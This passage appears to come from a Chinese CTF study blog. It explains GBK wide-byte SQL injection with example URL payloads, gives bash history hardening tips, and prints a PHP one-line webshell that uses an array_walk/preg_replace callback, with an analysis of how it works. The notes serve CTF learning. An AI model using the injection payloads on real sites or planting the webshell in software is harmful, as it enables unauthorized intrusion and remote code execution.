1</span><br></pre></td></tr></table></figure></p><p>一道综合题:<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">南邮CTF-综合题2</a>及其<a href="https://a2chitect.cn/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/" target="_blank" rel="noopener">writeup</a></p><h2 id="GBK宽字节编码漏洞-gbk-sql-injection"><a href="#GBK宽字节编码漏洞-gbk-sql-injection" class="headerlink" title="GBK宽字节编码漏洞(gbk_sql_injection)"></a>GBK宽字节编码漏洞(gbk_sql_injection)</h2><p>介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞<br>正常情况下 magic_quote_gpc 为ON,如果输入</p><p><code>http://www.xxxx.com/index.php?user=11′ and 1=2 #</code></p><p>SQL语句就会变成</p><p><code>SELECT * FROM user WHERE user=’1\’ and 1=2 #’</code></p><p>自动加上了\转义，如果构造特殊的宽字节编码呢？</p><p><code>http://www.xxxx.com/index.php?user=11%df%27 and 1=2 #</code></p><p>SQL语句就变成</p><p><code>SELECT * FROM user WHERE user=’11運’ and 1=2#’</code></p><p>这样就注入上了！</p><p><code>11%df</code>会被解析成<code>11運</code>,而<code>%27</code>被邪恶的解析成<code>&#39;</code>就绕过了gpc转义,就成功构造注入了</p><h1 id="Unix-Linux相关"><a href="#Unix-Linux相关" class="headerlink" title="Unix/Linux相关"></a>Unix/Linux相关</h1><h2 id="bash-history"><a href="#bash-history" class="headerlink" title="bash_history"></a>bash_history</h2><p>Bash shell在<code>~/.bash_history</code>（<code>~/</code>表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个<code>.bash_history</code>文件。</p><p>为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。</p><p>删除方法: 第一步：<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行确定所有用户的<code>.bash_history</code>文件中可以保存的旧命令条数。强烈建议把把<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行的值设为一个较小的数，比如30。编辑profile文件<code>vi /etc/profile</code>，把下面这行改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HISTFILESIZE=30</span><br><span class="line">HISTSIZE=30</span><br></pre></td></tr></table></figure></p><p>这表示每个用户的<code>.bash_history</code>文件只可以保存30条旧命令。</p><p>第二步：网管还应该在<code>/etc/skel/.bash_logout</code>文件中添加下面这行<code>rm -f $HOME/.bash_history</code>。这样，当用户每次注销时<code>.bash_history</code>文件都会被删除. </p><h2 id="vi编辑器的备份文件"><a href="#vi编辑器的备份文件" class="headerlink" title="vi编辑器的备份文件"></a>vi编辑器的备份文件</h2><p>linux下一般使用vi编辑器，并且异常退出会留下备份文件<code>xxx.swp</code></p><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="数组回调后门"><a href="#数组回调后门" class="headerlink" title="数组回调后门"></a>数组回调后门</h2><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;www&apos;];</span><br><span class="line">$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);</span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：利用了php中回调函数的后门，可以使<code>www</code>为<code>preg_replace</code>函数，当<code>array_walk()</code>将函数作用于数组时，POST传入的数据作为<code>preg_replace()</code>的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。</p><p>测试：<br><img src="/2018/10/12/CTF/hdhs.png" alt="image"></p><h1 id="未完待续。。。"><a href="#未完待续。。。" class="headerlink" title="未完待续。。。"></a>未完待续。。。</h1>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
